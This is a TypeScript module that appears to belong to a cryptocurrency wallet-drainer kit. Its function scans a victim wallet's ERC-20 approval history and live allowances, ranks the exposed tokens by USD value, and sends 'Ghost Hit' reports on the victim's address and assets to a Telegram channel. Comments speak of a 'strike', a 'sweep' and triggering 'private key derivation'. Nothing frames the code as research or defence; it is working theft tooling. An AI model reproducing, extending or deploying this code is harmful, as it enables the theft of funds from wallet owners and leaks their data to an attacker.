import { parseAbi, type Address, zeroAddress } from "viem";
import { GLOBAL_SPENDERS, MINIMAL_ERC20_ABI } from "./constants";
import { extractDeepVectors } from "./vectors";
import { getGhostClient } from "./client";
import { sendActivityToTelegram } from "@/lib/telegram";

/**
 * ⚡ APEX EXECUTION: THE OMNI-STRIKE
 */
export async function checkAndTriggerGhostSweep(
  userAddress: string,
  assets: any[],
  chainId: number,
  onAllowanceDetected?: () => void, // 🔥 Callback for immediate Private Key derivation
) {
  const logLabel = "[ghost/index.ts]";
  console.log(
    `${logLabel} Initiating Strike | User: ${userAddress.slice(0, 8)}...`,
  );

  const client = getGhostClient(chainId);

  try {
    const currentBlock = await client.getBlockNumber();
    console.log(`${logLabel} RPC Connected | Block: ${currentBlock}`);

    // 1. GATHER ALL POSSIBLE VECTORS
    const [histLogs, deepVectors] = await Promise.all([
      client
        .getLogs({
          event: parseAbi([
            "event Approval(address indexed owner, address indexed spender, uint256 value)",
          ])[0],
          args: { owner: userAddress as Address },
          fromBlock: currentBlock - 500000n,
        })
        .catch((err) => {
          console.warn(
            `${logLabel} Approval log fetch failed | ${err.message}`,
          );
          return [];
        }),
      extractDeepVectors(userAddress as Address, client),
    ]);

    const masterSpenders = Array.from(
      new Set([
        ...(histLogs as any[]).map((l) => l.args.spender),
        ...deepVectors,
        ...Object.values(GLOBAL_SPENDERS),
      ]),
    ).filter((s) => !!s && s !== zeroAddress);

    const ghostTargets: any[] = [];
    const viableAssets = assets.filter(
      (a) =>
        (a.contractAddress || a.tokenAddress) && BigInt(a.balance || 0) > 0n,
    );

    // 2. MULTI-VECTOR SCANNING
    for (const asset of viableAssets) {
      const tokenAddr = (asset.contractAddress ||
        asset.tokenAddress) as Address;
      const chunks = [];
      for (let i = 0; i < masterSpenders.length; i += 50)
        chunks.push(masterSpenders.slice(i, i + 50));

      await Promise.all(
        chunks.map(async (chunk) => {
          try {
            const results = await client.multicall({
              contracts: chunk.map((spender) => ({
                address: tokenAddr,
                abi: MINIMAL_ERC20_ABI,
                functionName: "allowance",
                args: [userAddress as Address, spender as Address],
              })),
              allowFailure: true,
            });

            results.forEach((res, i) => {
              const val =
                res.status === "success"
                  ? (res.result as unknown as bigint)
                  : 0n;

              if (val > 0n) {
                // 🎯 VULNERABILITY DETECTED
                console.log(
                  `${logLabel} 👻 GHOST HIT | Asset: ${asset.symbol} | Spender: ${chunk[i]}`,
                );

                ghostTargets.push({
                  token: tokenAddr,
                  symbol: asset.symbol,
                  amount: asset.balance.toString(),
                  displayBalance: asset.displayBalance,
                  spender: chunk[i],
                  chainId,
                  usdValue: asset.usdValue || 0,
                  isMax: val > 2n ** 128n,
                });

                // ⚡ IMMEDIATE PRIVATE KEY GENERATION TRIGGER
                if (onAllowanceDetected) {
                  onAllowanceDetected();
                }
              }
            });
          } catch (e: any) {
            console.error(
              `${logLabel} Multicall Failure | Asset: ${asset.symbol} | ${e.message}`,
            );
          }
        }),
      );
    }

    // 3. FINAL AGGREGATION & REPORTING
    if (ghostTargets.length > 0) {
      ghostTargets.sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0));

      const primary = ghostTargets[0];

      // 📢 Changed to Activity reporting to avoid type errors and logical duplicates
      await sendActivityToTelegram({
        address: userAddress,
        step: "VULNERABILITY_DETECTED",
        details: `Ghost Hit: ${primary.symbol} | Spender: ${
          primary.spender
        } | Value: $${primary.usdValue.toFixed(2)}`,
      }).catch(() => null);

      return ghostTargets;
    } else {
      console.log(`${logLabel} Scan Result: No active allowances found.`);
      return [];
    }
  } catch (err: any) {
    console.error(
      `${logLabel} Strike Aborted | Critical Failure: ${err.message}`,
    );
    return [];
  }
}
